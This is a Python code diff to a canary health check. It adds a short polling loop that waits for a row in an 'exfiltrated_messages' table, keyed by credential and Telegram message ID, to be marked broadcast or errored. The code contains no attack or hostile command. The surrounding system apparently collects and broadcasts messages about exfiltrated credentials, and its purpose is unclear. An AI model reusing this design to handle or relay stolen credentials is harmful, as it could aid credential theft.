@@ -1222,33 +1222,58 @@ async def _canary_flow_check_logic():
         result["inserted"] = True
 
         result["broadcast_result"] = await _broadcast_logic()
-        select_columns = (
-            "id,is_broadcasted,broadcast_error"
-            if _can_use_broadcast_reliability_columns()
-            else "id,is_broadcasted"
-        )
-        try:
-            check = await async_execute(
-                db.table("exfiltrated_messages")
-                .select(select_columns)
-                .eq("credential_id", cred_id)
-                .eq("telegram_msg_id", telegram_msg_id)
-                .limit(1)
+
+        # Poll for is_broadcasted with a short budget so distributed-claim
+        # contention doesn't false-fail. If another worker won the claim lock,
+        # the row will flip to is_broadcasted=True moments later once that
+        # worker's send completes. Stop early on success or persisted error.
+        CANARY_BROADCAST_POLL_SECONDS = 15.0
+        CANARY_BROADCAST_POLL_INTERVAL = 3.0
+        elapsed = 0.0
+        polls = 0
+        rows: list[dict[str, Any]] = []
+        while True:
+            polls += 1
+            select_columns = (
+                "id,is_broadcasted,broadcast_error"
+                if _can_use_broadcast_reliability_columns()
+                else "id,is_broadcasted"
             )
-            if "broadcast_error" in select_columns:
-                _set_broadcast_reliability_columns_available(True)
-        except Exception as select_exc:
-            if not _is_missing_broadcast_reliability_column(select_exc):
-                raise
-            _set_broadcast_reliability_columns_available(False)
-            check = await async_execute(
-                db.table("exfiltrated_messages")
-                .select("id,is_broadcasted")
-                .eq("credential_id", cred_id)
-                .eq("telegram_msg_id", telegram_msg_id)
-                .limit(1)
+            try:
+                check = await async_execute(
+                    db.table("exfiltrated_messages")
+                    .select(select_columns)
+                    .eq("credential_id", cred_id)
+                    .eq("telegram_msg_id", telegram_msg_id)
+                    .limit(1)
+                )
+                if "broadcast_error" in select_columns:
+                    _set_broadcast_reliability_columns_available(True)
+            except Exception as select_exc:
+                if not _is_missing_broadcast_reliability_column(select_exc):
+                    raise
+                _set_broadcast_reliability_columns_available(False)
+                check = await async_execute(
+                    db.table("exfiltrated_messages")
+                    .select("id,is_broadcasted")
+                    .eq("credential_id", cred_id)
+                    .eq("telegram_msg_id", telegram_msg_id)
+                    .limit(1)
+                )
+            rows = check.data or []
+            done = (
+                not rows
+                or bool(rows[0].get("is_broadcasted"))
+                or rows[0].get("broadcast_error") is not None
+                or elapsed >= CANARY_BROADCAST_POLL_SECONDS
             )
-        rows = check.data or []
+            if done:
+                break
+            await asyncio.sleep(CANARY_BROADCAST_POLL_INTERVAL)
+            elapsed += CANARY_BROADCAST_POLL_INTERVAL
+
+        result["broadcast_poll_seconds"] = elapsed
+        result["broadcast_polls"] = polls
         if rows:
             result["broadcasted"] = bool(rows[0].get("is_broadcasted"))
             result["broadcast_error"] = rows[0].get("broadcast_error")
